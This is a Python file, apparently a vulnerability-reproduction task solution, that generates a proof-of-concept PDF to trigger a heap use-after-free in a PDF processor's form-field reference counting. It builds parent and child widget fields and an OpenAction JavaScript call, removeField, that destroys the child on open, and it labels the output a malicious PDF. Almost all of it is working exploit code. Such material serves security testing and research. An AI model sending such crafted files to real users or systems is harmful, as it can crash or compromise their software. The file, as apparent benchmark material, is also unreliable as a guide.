import collections

class Solution:
    """
    Generates a Proof-of-Concept (PoC) input that triggers a Heap Use After Free
    vulnerability in a PDF processor.

    The vulnerability description indicates a reference counting error during the
    destruction of "standalone forms". Specifically:
    1. "passing the Dict to Object() does not increase the reference count": This suggests
       that when one PDF object (e.g., a child form field) refers to another (e.g., its
       parent), the process of resolving and wrapping the parent's dictionary does not
       correctly increment its reference count.
    2. "This leads to an extra unref operation during destruction": When the child field
       is destroyed, its destructor still attempts to decrement the parent's reference
       count. Since the initial increment never happened, this decrement is "extra".
    3. This can cause the parent's reference count to prematurely drop to zero, leading
       to its deallocation. Any other valid references to the parent object become
       dangling pointers, and subsequent use triggers a Use-After-Free.

    This PoC constructs a PDF with a parent-child form field relationship to create this
    exact scenario. A JavaScript `OpenAction` is used to trigger the destruction of the
    child field immediately upon document opening, reliably triggering the bug.
    """

    def solve(self, src_path: str) -> bytes:
        """
        Generates a PDF file that triggers the UAF.

        Args:
            src_path: Path to the vulnerable source code tarball (unused).

        Returns:
            A bytes object representing the malicious PDF file.
        """

        # JavaScript to be executed on document open.
        # This removes the child field, which triggers its destruction process and the bug.
        js_code = b'this.removeField("ChildTrigger");'

        # Define the PDF objects. We use an ordered dictionary to maintain object numbers.
        objects = collections.OrderedDict()

        # Object 1: Document Catalog. Includes the /OpenAction to run our JavaScript.
        objects[1] = b"""<<
  /Type /Catalog
  /Pages 2 0 R
  /AcroForm 4 0 R
  /OpenAction << /S /JavaScript /JS 7 0 R >>
>>"""
        # Object 2: Page Tree
        objects[2] = b"""<<
  /Type /Pages
  /Kids [3 0 R]
  /Count 1
>>"""
        # Object 3: The single Page object.
        objects[3] = b"""<<
  /Type /Page
  /Parent 2 0 R
  /MediaBox [0 0 612 792]
>>"""
        # Object 4: AcroForm Dictionary. It holds the reference to the form fields.
        # This reference to the parent (5 0 R) will be used after it's freed.
        objects[4] = b"""<<
  /Fields [5 0 R, 6 0 R]
  /NeedAppearances true
>>"""
        # Object 5: The Parent Field (the victim).
        # This object will be freed prematurely and then used.
        objects[5] = b"""<<
  /Type /Annot
  /Subtype /Widget
  /FT /Tx
  /T (ParentVictim)
  /Rect [100 700 200 720]
  /Kids [6 0 R]
>>"""
        # Object 6: The Child Field (the trigger).
        # Its destruction causes the UAF. It holds a /Parent reference to the victim.
        objects[6] = b"""<<
  /Type /Annot
  /Subtype /Widget
  /FT /Tx
  /T (ChildTrigger)
  /Rect [100 600 200 620]
  /Parent 5 0 R
>>"""
        # Object 7: The JavaScript code, as a PDF string object.
        objects[7] = b'(' + js_code + b')'

        # Assemble the PDF file components
        header = b"%PDF-1.7\n"
        
        body_parts = []
        xref_positions = {}
        current_pos = len(header)

        # Generate the body of the PDF from the object dictionary
        for num, data in objects.items():
            obj_str = f"{num} 0 obj\n".encode() + data + b"\nendobj\n"
            body_parts.append(obj_str)
            xref_positions[num] = current_pos
            current_pos += len(obj_str)

        body = b''.join(body_parts)
        
        # Determine the highest object number for the xref table and trailer
        max_obj_num = max(objects.keys()) if objects else 0

        # Generate the cross-reference (xref) table
        xref_table = b"xref\n"
        xref_table += f"0 {max_obj_num + 1}\n".encode()
        xref_table += b"0000000000 65535 f \n" # Entry for object 0
        for i in range(1, max_obj_num + 1):
            pos = xref_positions[i]
            xref_table += f"{pos:010d} 00000 n \n".encode()

        # Generate the trailer
        trailer = b"trailer\n"
        trailer += b"<<\n"
        trailer += f"  /Size {max_obj_num + 1}\n".encode()
        trailer += b"  /Root 1 0 R\n"
        trailer += b">>\n"

        # Generate the end of the file
        startxref = b"startxref\n"
        startxref += str(current_pos).encode() + b"\n"
        eof = b"%%EOF\n"

        # Combine all parts to form the final PoC
        poc = header + body + xref_table + trailer + startxref + eof
        return poc